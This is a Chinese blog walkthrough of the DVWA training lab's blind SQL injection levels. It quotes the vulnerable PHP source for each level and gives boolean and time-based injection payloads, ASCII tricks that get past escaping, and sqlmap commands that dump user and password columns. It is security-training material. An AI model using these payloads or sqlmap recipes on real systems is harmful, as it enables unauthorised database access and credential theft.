---
title: "网络安全 DVWA通关指南 DVWA SQL Injection (Blind SQL盲注)"
date: 2024-09-23 12:22:12
category: "DVWA靶场"
categories: 
  - "DVWA靶场"
tags:
- "web安全"
- "sql"
- "安全"
- "网络安全"
- "SQL盲注"
- "DVWA"
---



## DVWASQLInjection (Blind)

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424583.jpeg)





---

参考文献

- [WEB 安全靶场通关指南](https://www.cnblogs.com/linfangnan/p/13994655.html#dvwa-%E9%9D%B6%E5%9C%BA)

---

## Low

0、分析网页源代码

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
	// Get input
	$id = $_GET[ 'id' ];

	// Check database
	$getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

	// Get results
	$num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
	if( $num > 0 ) {
		// Feedback for end user
		$html .= '<pre>User ID exists in the database.</pre>';
	}
	else {
		// User wasn't found, so the page wasn't!
		header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

		// Feedback for end user
		$html .= '<pre>User ID is MISSING from the database.</pre>';
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
    
    
    
    
    
<?php

// 检查是否点击了提交按钮（例如，表单提交）
if( isset( $_GET[ 'Submit' ] ) ) {

    // 获取用户通过GET方式传递的ID值
    $id = $_GET[ 'id' ];

    // 创建SQL查询语句：根据$user_id查询users表中的first_name和last_name字段
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";

    // 执行SQL查询（假设$___mysqli_ston是全局的数据库连接对象）
    // 使用@字符抑制可能出现的MySQL错误信息
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid );

    // 获取查询结果中记录的数量
    $num = @mysqli_num_rows( $result );

    // 判断查询结果中是否存在记录
    if( $num > 0 ) {
        // 如果查询到至少一条记录，则输出反馈信息表示用户ID存在于数据库中
        $html .= '<pre>User ID exists in the database.</pre>';
    }
    else {
        // 若未查询到任何记录，则发送HTTP 404状态码（页面未找到）
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // 同时输出反馈信息表示用户ID在数据库中不存在
        $html .= '<pre>User ID is MISSING from the database.</pre>';
    }

    // 关闭数据库连接
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
// 从URL参数中获取一个id，然后查询数据库中是否存在对应这个id的用户。如果存在，它会在页面上显示"User ID exists in the database."；如果不存在，则发送HTTP 404状态码并显示"User ID is MISSING from the database."。
```

网页不会直接返回数据，而是返回特定信息。比如输入1，页面返回“User ID exists in the database.”，查询内容没有回显。

 ![image-20240508105954105](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424584.png)

### 布尔盲注

> **布尔盲注** ：通过构造SQL查询使结果影响网页响应（如页面内容变化），从而通过真/假判断逐位推测数据库信息。

1、判断注入类型

注入以下语句，根据回显信息查询成功

```
1' and 1=1#
```

 ![image-20240508110618261](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424585.png)

注入以下语句，根据回显信息查询失败。由此，判断此为字符型注入，并且需要单引号闭合。

```
1' and 1=2#
```

 ![image-20240508111005482](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424586.png)

2、获取版本号

首先探测版本号的长度，使用substr函数提取返回的版本号字符串，用length函数获得版本号字符串的长度，判断与猜测长度"1"是否相等。返回查询不存在，说明版本号字符串长度不为猜测长度"1"。

```
1' and length(substr((select version()),1)) = 1 #

// VERSION()函数以字符串形式返回 MySQL 数据库的当前版本。
// length() 函数用于获取字符串的长度
// substr( string, start, length) 函数用于截取字符串 string，start 为起始位置，length 为长度。
```

 ![image-20240508111726299](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424587.png)

迭代查询语句，最后在猜测长度"6"返回查询存在，说明版本号字符串长度为6

```
1' and length(substr((select version()),1)) = 6 #
```

 ![image-20240508112420486](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424588.png)

接下来获取版本号字符串的内容，MySql的版本号由三个数字部分和可选的后缀组成，用点(“.”)分隔各个部分，形如 `5.7.23` 。猜测第一个数字为’5’，注入以下语句，返回查询结果存在，说明第一个字符为’5’。

```
1' and substr((select version()),1,1) = '5'#
```

 ![image-20240508170141095](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424589.png)

通过采用穷举的方法，逐步尝试输入0 ~ 9的数字以及"."符号，来进行SQL盲注攻击。在这一过程中，每一次注入测试都是为了识别能够成功执行的SQL查询部分。最终，将得到的字符片段拼接起来，确定了MySQL数据库的版本号为“5.7.26”。

```
1' and substr((select version()),2,1) = '.'#
1' and substr((select version()),3,1) = '7'#
1' and substr((select version()),4,1) = '.'#
1' and substr((select version()),5,1) = '2'#
1' and substr((select version()),6,1) = '6'#
```

### 时间盲注

> **时间盲注** ：利用数据库延时函数（如 `SLEEP` ），根据响应时间长短推断SQL查询真伪，逐步获取数据库内容。

1、判断注入类型

注入以下语句，服务器响应时间很短，不足3秒，说明sleep()函数没有执行。

```
1 and sleep(3) #
// SLEEP()函数是一个用于控制程序流程的函数，它能够让当前的SQL语句执行暂停一定的时间后再继续。
```

 ![image-20240508174027495](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424590.png)

注入以下语句，服务器响应时间达到3秒，说明sleep()函数执行，判断注入类型为字符型盲注。

```
1' and sleep(3) #
```

 ![image-20240508173801671](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424592.png)

2、获取版本号

注入以下语句，猜测版本号字符串的长度为1，服务器响应很快，说明sleep()函数没有执行。

```
1' and if(length(substr((select version()), 1)) = 1, sleep(3), 1)#
// if(expr1,expr2,expr3) 语句，如果 expr1 的结果是 True，则返回 expr2，否则返回 expr3。
```

依次测试到6时，可以感觉到服务器明显延迟，抓包发现响应时间大于3秒，说明版本号字符串长度为6。

```
1' and if(length(substr((select version()), 1)) = 6, sleep(3), 1)#
```

 ![image-20240509091945541](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424593.png)

接下来获取版本号字符串的内容，MySql 的版本号由三个数字部分和可选的后缀组成，用点(“.”)分隔各个部分，形如 `5.7.23` 。猜测第一个数字为’5’，注入以下语句，服务器响应时间大于三秒，说明第一个字符为’5’。

```
1' and if(substr((select version()), 1, 1) = '5', sleep(3), 1)#
```

通过采用穷举的方法，逐步尝试输入0 ~ 9的数字以及"."符号，来进行SQL盲注攻击。在这一过程中，每一次注入测试都是为了识别能够成功执行的SQL查询部分。最终，将服务器有大于 3 秒的延迟的字符片段拼接起来，确定了MySQL数据库的版本号为“5.7.26”。

```
1' and if(substr((select version()), 2, 1) = '.', sleep(3), 1)#
1' and if(substr((select version()), 3, 1) = '7', sleep(3), 1)#
1' and if(substr((select version()), 4, 1) = '.', sleep(3), 1)#
1' and if(substr((select version()), 5, 1) = '2', sleep(3), 1)#
1' and if(substr((select version()), 6, 1) = '6', sleep(3), 1)#
```

### sqlmap

1、判断注入点

用sqlmap工具进行自动化注入，首先判断注入点，获取cookie值，拼接语句。爆破数据库名。

```
sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low" --batch --dbs
```

 ![image-20240509092715089](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424594.png)

得到数据库名后，选择dvwa数据库，爆破dvwa数据库下的表名。

```
sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low" --batch -D dvwa --tables
```

 ![image-20240509093153249](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424595.png)

选择users数据表，查看users数据表有哪些字段

```
sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low" --batch -D dvwa -T users --columns
```

 ![image-20240509093314608](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424596.png)

选择users数据表下的user、password字段

```
sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low" --batch -D dvwa -T users -C user,password --dump
```

 ![image-20240509093507168](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424597.png)

## Medium

0、分析网页源代码

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$id = $_POST[ 'id' ];
    //POST方式提交数据
	$id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    //使用mysqli_real_escape_string()函数防范SQL注入

	// Check database
	$getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

	// Get results
	$num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
	if( $num > 0 ) {
		// Feedback for end user
		$html .= '<pre>User ID exists in the database.</pre>';
	}
	else {
		// Feedback for end user
		$html .= '<pre>User ID is MISSING from the database.</pre>';
	}

	//mysql_close();
}

?>

```

将DVWA Security调整到Medium级别，发现原本提交数据的文本框变成了下拉列表，需要使用Burp Suite抓包修改提交数据。同时，源代码中使用mysqli_real_escape_string()函数防范SQL注入，mysqli_real_escape_string()函数会转义字符串中的特殊字符，如 \x00、\n、\r、\、'、" 和 \x1a。

 ![image-20240509094258008](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424598.png)

 ![image-20240509094324275](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424599.png)

虽然单引号在Medium级别中被转义，但我们可以使用ASCII码值来代替原来单引号括起来的字符。ascii() 函数可以将字符转换成 ASCII码值，然后我们同样把版本号的各个字符提取出来，然后和 0 ~ 9 和 “.” 11 个字符的 ASCII码值作比较。例如注入如下内容，可以测试出版本号第一个字符为 “5”。

```
1 and ascii(substr((select version()), 1, 1)) = 53#
```

 ![image-20240509101517241](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424600.png)

```
0 ~ 9 和 “.” 11 个字符的 ASCII码值
. --> 46
0 --> 48
1 --> 49
2 --> 50
3 --> 51
4 --> 52
5 --> 53
6 --> 54
7 --> 55
8 --> 56
9 --> 57
```

时间盲注也是需要加上ascii() 函数，用ascii码值进行判断。

```
1 and if(ascii(substr((select version()), 1, 1)) = 53, sleep(3), 1)#
```

 ![image-20240509102055721](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424601.png)

**布尔盲注代码** 

```
1 and length(substr((version()), 1)) = 6#
1 and ascii(substr((select version()), 1, 1)) = 53#
1 and ascii(substr((select version()), 2, 1)) = 46#
1 and ascii(substr((select version()), 3, 1)) = 55#
1 and ascii(substr((select version()), 4, 1)) = 46#
1 and ascii(substr((select version()), 5, 1)) = 50#
1 and ascii(substr((select version()), 6, 1)) = 54#
```

**时间盲注代码** 

```
1 and if(length(substr((version()), 1)) = 6, sleep(3), 1)#
1 and if(ascii(substr((select version()), 1, 1)) = 53, sleep(3), 1)#
1 and if(ascii(substr((select version()), 2, 1)) = 46, sleep(3), 1)#
1 and if(ascii(substr((select version()), 3, 1)) = 55, sleep(3), 1)#
1 and if(ascii(substr((select version()), 4, 1)) = 46, sleep(3), 1)#
1 and if(ascii(substr((select version()), 5, 1)) = 50, sleep(3), 1)#
1 and if(ascii(substr((select version()), 6, 1)) = 54, sleep(3), 1)#
```

## High

0、分析网页源代码

```php
<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
	// Get input
	$id = $_COOKIE[ 'id' ];

	// Check database
	$getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

	// Get results
	$num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
	if( $num > 0 ) {
		// Feedback for end user
		$html .= '<pre>User ID exists in the database.</pre>';
	}
	else {
		// Might sleep a random amount
		if( rand( 0, 5 ) == 3 ) {
			sleep( rand( 2, 4 ) );
		}

		// User wasn't found, so the page wasn't!
		header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

		// Feedback for end user
		$html .= '<pre>User ID is MISSING from the database.</pre>';
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
//代码通过LIMIT 1限制SQL查询结果，使用Cookie传参，并在查询无结果时执行sleep()，以此来混淆时间盲注判断，提高了SQL注入攻击门槛
```

由于查询无结果时，服务器会等待一段时间，混淆时间盲注判断，所以我们使用布尔盲注。尽管源代码中使用 `LIMIT 1` 语句限制查询结果，但可以通过’#'注释掉，没有影响。与Low级别的布尔盲注攻击方法一致。

**SqlMap使用** 

1、在网页提交一个参数，使用Burp Suite抓包，将抓包内容保存在一个.txt文本（1.txt）。抓包内容如下：

```
POST /vulnerabilities/sqli_blind/cookie-input.php HTTP/1.1
Host: dvwa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://dvwa
Connection: close
Referer: http://dvwa/vulnerabilities/sqli_blind/cookie-input.php
Cookie: id=1; PHPSESSID=r25rluk5p6u15do5hvba9airl1; security=high
Upgrade-Insecure-Requests: 1

id=1&Submit=Submit
```

在SqlMap中，使用如下语句，探测出Apache、PHP、MySQL版本号。

```
sqlmap -r "文件地址" --second-url "回显页面URL" --batch
sqlmap -r "C:\1.txt" --second-url "http://dvwa/vulnerabilities/sqli_blind/" --batch
```

 ![image-20240509175037711](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424602.png)

盲注有点慢，反而对猜测的过程有更直观的认识了。

```
sqlmap -r "C:\Users\yuexuan\Desktop\1.txt" --second-url "http://dvwa/vulnerabilities/sqli_blind/" --batch --dbs
```

 ![image-20240509175153935](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424603.png)

```
sqlmap -r "C:\Users\yuexuan\Desktop\1.txt" --second-url "http://dvwa/vulnerabilities/sqli_blind/" --batch -D dvwa --tables
```

 ![image-20240509175349013](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424604.png)

```
sqlmap -r "C:\Users\yuexuan\Desktop\1.txt" --second-url "http://dvwa/vulnerabilities/sqli_blind/" --batch -D dvwa -T users --columns
```

 ![image-20240509175850523](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424605.png)

```
sqlmap -r "C:\Users\yuexuan\Desktop\1.txt" --second-url "http://dvwa/vulnerabilities/sqli_blind/" --batch -D dvwa -T users -C user,password --dump
```

## Impossible

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Get input
	$id = $_GET[ 'id' ];

	// Was a number entered?
	if(is_numeric( $id )) {
		// Check the database
		$data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
		$data->bindParam( ':id', $id, PDO::PARAM_INT );
		$data->execute();

		// Get results
		if( $data->rowCount() == 1 ) {
			// Feedback for end user
			$html .= '<pre>User ID exists in the database.</pre>';
		}
		else {
			// User wasn't found, so the page wasn't!
			header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

			// Feedback for end user
			$html .= '<pre>User ID is MISSING from the database.</pre>';
		}
	}
}

// Generate Anti-CSRF token
generateSessionToken();

?>

```